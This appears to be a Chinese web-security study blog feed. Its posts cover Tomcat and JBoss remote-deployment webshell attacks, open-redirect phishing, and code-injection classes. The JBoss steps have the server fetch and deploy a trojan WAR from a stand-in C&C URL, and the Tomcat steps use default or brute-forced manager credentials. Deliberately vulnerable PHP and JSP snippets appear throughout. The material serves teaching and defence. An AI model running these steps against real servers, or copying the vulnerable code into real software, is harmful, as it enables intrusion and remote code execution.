keyword">as</span> <span class="token string">'d:/'</span><span class="token punctuation">;</span><span class="token comment">//生成文件盘符</span><span class="token keyword">grant</span> <span class="token keyword">read</span><span class="token punctuation">,</span><span class="token keyword">write</span> <span class="token keyword">on</span> directory dir_dump <span class="token keyword">to</span> psbc<span class="token punctuation">;</span><span class="token comment">//创建存储过程outputstr</span><span class="token keyword">create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> <span class="token keyword">procedure</span> outputstr<span class="token operator">is</span>outputstr_handle utl_file<span class="token punctuation">.</span>file_type<span class="token punctuation">;</span><span class="token keyword">begin</span>outputstr_handle :<span class="token operator">=</span> utl_file<span class="token punctuation">.</span>fopen<span class="token punctuation">(</span><span class="token string">'dir_dump'</span><span class="token punctuation">,</span><span class="token string">'oracle.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//文件名称</span><span class="token keyword">for</span> x <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> cmd<span class="token punctuation">)</span> <span class="token keyword">loop</span>utl_file<span class="token punctuation">.</span>put_line<span class="token punctuation">(</span>outputstr_handle<span class="token punctuation">,</span>x<span class="token punctuation">.</span>ID <span class="token operator">||</span> <span class="token string">','</span> <span class="token operator">||</span> x<span class="token punctuation">.</span>RQ <span class="token operator">||</span> <span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span> <span class="token keyword">loop</span><span class="token punctuation">;</span>utl_file<span class="token punctuation">.</span>fclose<span class="token punctuation">(</span>outputstr_handle<span class="token punctuation">)</span><span class="token punctuation">;</span>exception <span class="token keyword">when</span> others <span class="token keyword">then</span>dbms_output<span class="token punctuation">.</span>put_line<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>sqlerrm<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token punctuation">;</span><span class="token keyword">begin</span>outputstr<span class="token comment">//调用存储过程</span><span class="token keyword">end</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用存储过程后，将会把cmd表中的数据导入到d:&#x2F;oracle.txt中</p><h2 id="网站备份功能"><a href="#网站备份功能" class="headerlink" title="网站备份功能"></a>网站备份功能</h2><p>使用网站备份功能备份出一条webshell</p><h2 id="文件上传功能"><a href="#文件上传功能" class="headerlink" title="文件上传功能"></a>文件上传功能</h2><h2 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h2>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0day</title>
      <link href="/2022/03/27/0day/"/>
      <url>/2022/03/27/0day/</url>
      
        <content type="html"><![CDATA[<h1 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h1><h2 id="0day简介"><a href="#0day简介" class="headerlink" title="0day简介"></a>0day简介</h2><p>0day的含义为破解,最早的破解是专门针对软件的,叫作WAREZ。<br>0day中的0表示Zero,早期的0day表示在软件发行后的24小时内就出现了破解版本。<br>现在,0day已经引申了这个含义,一般是指没有公开,没有补丁的漏洞,也就是未公开的漏洞。</p><h2 id="0day挖掘"><a href="#0day挖掘" class="headerlink" title="0day挖掘"></a>0day挖掘</h2><h3 id="源代码审计-白盒测试"><a href="#源代码审计-白盒测试" class="headerlink" title="源代码审计(白盒测试)"></a>源代码审计(白盒测试)</h3><p>半自动工具：<br><code>Source Navigator</code><br><code>Fortify SCA</code><br><code>CheckMarx</code><br><code>CodeScan</code><br><code>Skavenger</code></p><h3 id="模糊渗透测试-黑盒测试"><a href="#模糊渗透测试-黑盒测试" class="headerlink" title="模糊渗透测试(黑盒测试)"></a>模糊渗透测试(黑盒测试)</h3>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>web server远程部署漏洞</title>
      <link href="/2022/03/22/web-server%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/03/22/web-server%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="web-server远程部署漏洞"><a href="#web-server远程部署漏洞" class="headerlink" title="web server远程部署漏洞"></a>web server远程部署漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>很多web服务器支持远程部署，如:FTP<br>如果web服务器的远程部署功能配置不当，就会造成远程部署漏洞，就会导致攻击者利用远程部署功能入侵web服务器<br>web服务器远程部署漏洞不属于代码层次的漏洞，而是属于配置性错误漏洞</p><h2 id="常见的web服务器远程部署漏洞"><a href="#常见的web服务器远程部署漏洞" class="headerlink" title="常见的web服务器远程部署漏洞"></a>常见的web服务器远程部署漏洞</h2><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><h4 id="tomcat简介"><a href="#tomcat简介" class="headerlink" title="tomcat简介"></a>tomcat简介</h4><p>tomcat是Java Web应用服务器，由apache公司开发<br>默认端口为8080</p><h4 id="tomcat远程部署漏洞"><a href="#tomcat远程部署漏洞" class="headerlink" title="tomcat远程部署漏洞"></a>tomcat远程部署漏洞</h4><p>tomcat安装后，访问127.0.0.1:8080</p><img src="/2022/03/22/web-server%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2%E6%BC%8F%E6%B4%9E/tomcat1.png" class=""><p>点击图中的Manager App按钮，就会弹出登陆框要求我们登陆。<br>当我们登陆后就会进入管理页面</p><img src="/2022/03/22/web-server%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2%E6%BC%8F%E6%B4%9E/tomcat2.png" class=""><p>管理员可以通过要部署的WAR文件这一栏对web应用程序动态部署，非常方便</p><img src="/2022/03/22/web-server%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2%E6%BC%8F%E6%B4%9E/tomcat3.png" class=""><p>管理员仅仅需要上传一个WAR格式的文件就可以发布到网站<br>同理，攻击者同样可以上传一个WAR格式的文件部署一个JSP木马</p><h5 id="攻击前提"><a href="#攻击前提" class="headerlink" title="攻击前提"></a>攻击前提</h5><ul><li>登陆账号是管理员账号，且可以访问Manager App(用户角色为manager-gui）<br>在tomcat目录下的conf目录下的tomcat-users.xml中定义,例：<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tomcat-users</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role</span> <span class="token attr-name">rolename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tomcat<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  #普通用户角色<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role</span> <span class="token attr-name">rolename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>manager-gui<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  #管理员用户角色,权限可以访问Manager App,像manager-script,manager-jmx,manager-status虽为管理员用户角色，但无权限访问Manager App<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span> <span class="token attr-name">username</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>admin<span class="token punctuation">"</span></span> <span class="token attr-name">password</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123456<span class="token punctuation">"</span></span> <span class="token attr-name">roles</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>manager-gui<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>#管理员用户，可以访问Manager App<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span> <span class="token attr-name">username</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span> <span class="token attr-name">password</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span> <span class="token attr-name">roles</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tomcat<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>#普通用户，无权访问Manager App<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tomcat-users</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="攻击姿势"><a href="#攻击姿势" class="headerlink" title="攻击姿势"></a>攻击姿势</h5><p>假如目标tomcat服务器的tomcat-users.xml中定义了管理员用户(用户角色为manager-gui），且管理员密码是弱口令或默认用户名密码(tomcat,tomcat）<br>我们可以通过爆破的方式爆破出管理员的账号密码，然后登陆进入Manager App页面或者使用默认用户名密码登陆进入。<br>在本地创建一个shell.jsp文件，内容为一句话木马</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%out.println(&quot;JSP shell&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用jar.exe把shell.jsp打包为shell.war文件</p><pre class="line-numbers language-command" data-language="command"><code class="language-command">jar.exe -cvf shell.war shell.jsp <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后上传shell.war文件。<br>上传文件shell.war的保存位置在<code>127.0.0.1:8080/shell.war</code>(无法访问，404),上传shell.war后会在web根目录下新建一个<code>shell</code>目录,该目录下会生成<code>shell.jsp</code>文件(如果本地文件是shell.jsp，打包为6.war。上传6.war文件后会在web根目录下新建一个<code>6</code>目录，该目录下会生成<code>shell.jsp</code>）<br>访问<code>127.0.0.1:8080/shell/shell.jsp</code>,成功获得webshell</p><h5 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h5><p>如果web服务器需要使用远程部署功能，就需要设定高强度密码；<br>如果web服务器不需要使用远程部署功能，就需要关闭或者删除远程部署功能</p><h3 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h3><h4 id="JBOSS简介"><a href="#JBOSS简介" class="headerlink" title="JBOSS简介"></a>JBOSS简介</h4><p>基于Java EE的开源应用服务器<br>默认端口8080</p><h4 id="JBOSS未授权访问漏洞"><a href="#JBOSS未授权访问漏洞" class="headerlink" title="JBOSS未授权访问漏洞"></a>JBOSS未授权访问漏洞</h4><h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>jboss-6.1.0.Final及以下版本</p><h5 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h5><p>访问web服务器根目录下的<code>jmx-console</code>(无需用户名和密码)会进入控制台页面，在该页面的<code>jboss.deployment</code>下可以添加打包好的war后缀的木马文件的URL,例:<code>http://www.hack.com/shell.war</code>,然后点击invoke按钮，就会在服务器根目录下的shell目录(视情况而定)下生成一个jsp木马</p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>访问jboss服务器根目录127.0.0.1:8080</p><img src="/2022/03/22/web-server%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2%E6%BC%8F%E6%B4%9E/jb1.png" class=""><p>点击jmx-console进入控制台页面(或直接访问:<a href="http://127.0.0.1:8080/jmx-console">http://127.0.0.1:8080/jmx-console</a>)</p><img src="/2022/03/22/web-server%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2%E6%BC%8F%E6%B4%9E/jb2.png" class=""><p>点击<code>jboss.deployment</code></p><img src="/2022/03/22/web-server%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2%E6%BC%8F%E6%B4%9E/jb3.png" class=""><p>点击<code>flavor=URL,type=DeploymentScanner</code></p><img src="/2022/03/22/web-server%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2%E6%BC%8F%E6%B4%9E/jb4.png" class=""><p>选择<code>addURL</code>选项(任何一个都行)</p><img src="/2022/03/22/web-server%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2%E6%BC%8F%E6%B4%9E/jb5.png" class=""><p>在Parameters列的对应空格中输入c&amp;c服务器上的打包好的war文件,如:<code>http://www.hack.com/shell.war</code></p><img src="/2022/03/22/web-server%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2%E6%BC%8F%E6%B4%9E/jb6.png" class=""><p>点击invoke按钮，部署成功会显示</p><img src="/2022/03/22/web-server%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2%E6%BC%8F%E6%B4%9E/jb7.png" class=""><p>此时访问<code>http://127.0.0.1:8080/shell/shell.jsp</code>,木马成功执行<br>注：此时shell.jsp为临时文件，服务器重启后文件消失</p><h5 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p>将JBOSS的jmx-console的密码认证开启，或者删除jmx-console</p><h5 id="注"><a href="#注" class="headerlink" title="注"></a>注</h5><p>由于JBOSS的jmx-console默认没有密码认证策略，所以攻击者常常通过google hack批量获取webshell</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>apache-tomcat安装</title>
      <link href="/2022/03/21/apache-tomcat%E5%AE%89%E8%A3%85/"/>
      <url>/2022/03/21/apache-tomcat%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="apache-tomcat安装"><a href="#apache-tomcat安装" class="headerlink" title="apache-tomcat安装"></a>apache-tomcat安装</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>官网地址:<a href="https://tomcat.apache.org/">https://tomcat.apache.org</a><br>如:<img src="/2022/03/21/apache-tomcat%E5%AE%89%E8%A3%85/down.png" class=""><br>将文件解压到某个文件夹下</p><h2 id="安装-安装前需要安装JAVA环境"><a href="#安装-安装前需要安装JAVA环境" class="headerlink" title="安装(安装前需要安装JAVA环境)"></a>安装(安装前需要安装JAVA环境)</h2><p>进入解压后文件的bin目录，执行<code>service.bat install</code><br>安装成功则显示”…has been installed”</p><h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>进入系统变量界面，点击新建</p><img src="/2022/03/21/apache-tomcat%E5%AE%89%E8%A3%85/%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F1.png" class=""><p>变量名输入<code>CATALINA_HOME</code>,变量值为apache-tomcat的目录，如</p><img src="/2022/03/21/apache-tomcat%E5%AE%89%E8%A3%85/%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F2.png" class=""><p>编辑系统变量中的Path变量，点击新建，输入<code>%CATALINA_HOME%\bin</code>,如</p><img src="/2022/03/21/apache-tomcat%E5%AE%89%E8%A3%85/%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F3.png" class=""><p>点击确定</p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>进入tomcat文件的bin目录，执行<code>startup.bat</code>文件<br>如果终端显示</p><img src="/2022/03/21/apache-tomcat%E5%AE%89%E8%A3%85/success.png" class=""><p>代表启动成功。访问<code>127.0.0.1:8080</code>,显示</p><img src="/2022/03/21/apache-tomcat%E5%AE%89%E8%A3%85/%E9%A1%B5%E9%9D%A2.png" class=""><p>如果终端显示</p><img src="/2022/03/21/apache-tomcat%E5%AE%89%E8%A3%85/startup1.png" class=""><p>我们就需要打开bin目录下的setclasspath.bat文件，在文件中添加<br><code>set JAVA_HOME=JDK安装目录</code><br><code>set JRE_HOME=JRE安装目录</code><br>例:</p><img src="/2022/03/21/apache-tomcat%E5%AE%89%E8%A3%85/setclasspath.png" class=""><p>保存，再次执行<code>startup.bat</code>文件，则启动成功</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>URL跳转与钓鱼</title>
      <link href="/2022/03/15/URL%E8%B7%B3%E8%BD%AC%E4%B8%8E%E9%92%93%E9%B1%BC/"/>
      <url>/2022/03/15/URL%E8%B7%B3%E8%BD%AC%E4%B8%8E%E9%92%93%E9%B1%BC/</url>
      
        <content type="html"><![CDATA[<h1 id="URL跳转与钓鱼"><a href="#URL跳转与钓鱼" class="headerlink" title="URL跳转与钓鱼"></a>URL跳转与钓鱼</h1><h2 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h2><h3 id="客户端跳转"><a href="#客户端跳转" class="headerlink" title="客户端跳转"></a>客户端跳转</h3><p>客户端跳转又被称为URL重定向，客户端浏览器的URL会发生变化</p><h4 id="客户端跳转过程"><a href="#客户端跳转过程" class="headerlink" title="客户端跳转过程"></a>客户端跳转过程</h4><p>当前url<code>http://www.example.com/index.jsp</code><br>当点击登陆按钮后，url变为<code>http://www.example.com/login.jsp</code>。url发生了变化，页面也发生了变化<br>特点:url变化，页面变化</p><ul><li>示例<br>由于index.jsp文件中含有重定向语句<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%response.sendRedirect(&quot;x.jsp&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>当我们在浏览器中打开index.jsp时，服务器解析index.jsp并把响应的内容发送给浏览器。HTTP过程如下:<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;index.jsp HTTP&#x2F;1.1Host: www.xxx.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 302 Moved TemporarilyServer: ApacheLocation: http:&#x2F;&#x2F;www.xxx.com&#x2F;x.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;x.jsp HTTP&#x2F;1.1Host: www.xxx.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>当浏览器请求index.jsp后，收到302指示(也叫重定向)就会立刻进行跳转，而用户是感觉不到的</li></ul><h3 id="服务器端跳转"><a href="#服务器端跳转" class="headerlink" title="服务器端跳转"></a>服务器端跳转</h3><p>服务器端跳转又被称为URL转发，客户端浏览器的URL不会发生变化</p><h4 id="服务器端跳转过程"><a href="#服务器端跳转过程" class="headerlink" title="服务器端跳转过程"></a>服务器端跳转过程</h4><p>当前url<code>http://www.example.com/index.jsp</code><br>当点击登陆按钮后，url不变，但是页面发生了变化，由<code>index.jsp</code>变为了<code>login.jsp</code><br>特点:url不变，页面变化</p><ul><li>示例<br>由于index.jsp文件中含有URL转发代码<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">request.getRequestDispatcher(&quot;upload.jsp&quot;).forward(request,response);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>当我们在浏览器中打开index.jsp时，服务器解析index.jsp并把响应的内容发送给浏览器。HTTP过程如下:<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;index.jsp HTTP&#x2F;1.1Host: www.xxx.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 OKServer: Apache&lt;html&gt;&lt;head&gt;Upload Jsp&lt;&#x2F;head&gt;...&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>注:还有一些跳转既不属于转发，也不属于重定向，而是直接向服务器发送请求。如:a标签</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.example.com/666.jsp<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>点击<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><p>钓鱼指钓鱼式攻击</p><h3 id="钓鱼网站的传播途径"><a href="#钓鱼网站的传播途径" class="headerlink" title="钓鱼网站的传播途径"></a>钓鱼网站的传播途径</h3><p>电子邮箱，社交网站等信息交流渠道</p><h3 id="厂商针对钓鱼网站的防护手段"><a href="#厂商针对钓鱼网站的防护手段" class="headerlink" title="厂商针对钓鱼网站的防护手段"></a>厂商针对钓鱼网站的防护手段</h3><p>黑白名单策略：当攻击者在电子邮箱，社交网站等中发布钓鱼网站的URL时，这类通信软件就会通过检测该URL是否在黑白名单中来判断该URL是不是钓鱼网站或恶意网站。检测的是URL，而并非是网站的内容。如果是，则弹出警告信息。</p><h3 id="针对黑白名单策略的绕过"><a href="#针对黑白名单策略的绕过" class="headerlink" title="针对黑白名单策略的绕过"></a>针对黑白名单策略的绕过</h3><p>由于黑白名单策略检测的是URL，攻击者就可以利用URL跳转漏洞来绕过<br>例:<br>服务端index.jsp,存在URL跳转漏洞</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%String url &#x3D; request.getParameter(&quot;url&quot;);if(!(url&#x3D;&#x3D;null))&#123;response.sendRedirect(url);&#125;%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当攻击者构造URL<code>http://wwww.example.com/index.jsp?url=http://www.fish.com</code><br>因为<code>http://www.example.com</code>是正常的URL，所以通信软件不会发出警告。但因为服务器存在URL跳转漏洞，导致用户的浏览器页面从index.jsp跳转到钓鱼网站。如果用户在钓鱼网站中输入账号密码，就会被攻击者窃取<br>注：URL转发不可作为URL跳转漏洞，因为URL转发是无法进行域名跳转的。所以URL跳转漏洞也被称为URL重定向漏洞</p><h3 id="服务器脚本中进行重定向操作的代码"><a href="#服务器脚本中进行重定向操作的代码" class="headerlink" title="服务器脚本中进行重定向操作的代码"></a>服务器脚本中进行重定向操作的代码</h3><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: <span class="token interpolation"><span class="token variable">$url</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"url"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码注入漏洞</title>
      <link href="/2022/03/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/03/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="代码注入漏洞"><a href="#代码注入漏洞" class="headerlink" title="代码注入漏洞"></a>代码注入漏洞</h1><h2 id="代码注入漏洞定义"><a href="#代码注入漏洞定义" class="headerlink" title="代码注入漏洞定义"></a>代码注入漏洞定义</h2><p>owasp定义:在客户端提交的代码在服务器端接收后当作动态代码或嵌入文件处理<br>wikipedia定义:客户端所提交的数据未经检查就让web服务器去执行</p><h2 id="OWASP-代码注入漏洞分类"><a href="#OWASP-代码注入漏洞分类" class="headerlink" title="OWASP-代码注入漏洞分类"></a>OWASP-代码注入漏洞分类</h2><h3 id="OS命令执行漏洞"><a href="#OS命令执行漏洞" class="headerlink" title="OS命令执行漏洞"></a>OS命令执行漏洞</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$command</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'command'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$page</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="动态函数调用"><a href="#动态函数调用" class="headerlink" title="动态函数调用"></a>动态函数调用</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"666"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$fun</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myvar</span><span class="token operator">=</span><span class="token string double-quoted-string">"varname"</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$myvar = \$x;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="wikipedia-代码注入漏洞分类"><a href="#wikipedia-代码注入漏洞分类" class="headerlink" title="wikipedia-代码注入漏洞分类"></a>wikipedia-代码注入漏洞分类</h2><p>SQL注入,XML注入,XSS,文件包含,命令执行等都可视为代码注入的范畴</p><h2 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h2><h3 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h3><p>XML(The Extensible Markup Language）可扩展标识语言<br>XML最初设计的目的是弥补HTML的不足，后来逐渐用于网络数据的转换和描述<br>XML的设计宗旨是传输数据，并非显示数据<br>XML在web中的应用非常广泛，XML是各种应用程序之间数据传输中最常用的工具</p><h3 id="XML示例"><a href="#XML示例" class="headerlink" title="XML示例"></a>XML示例</h3><p>admin.xml:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manager</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span 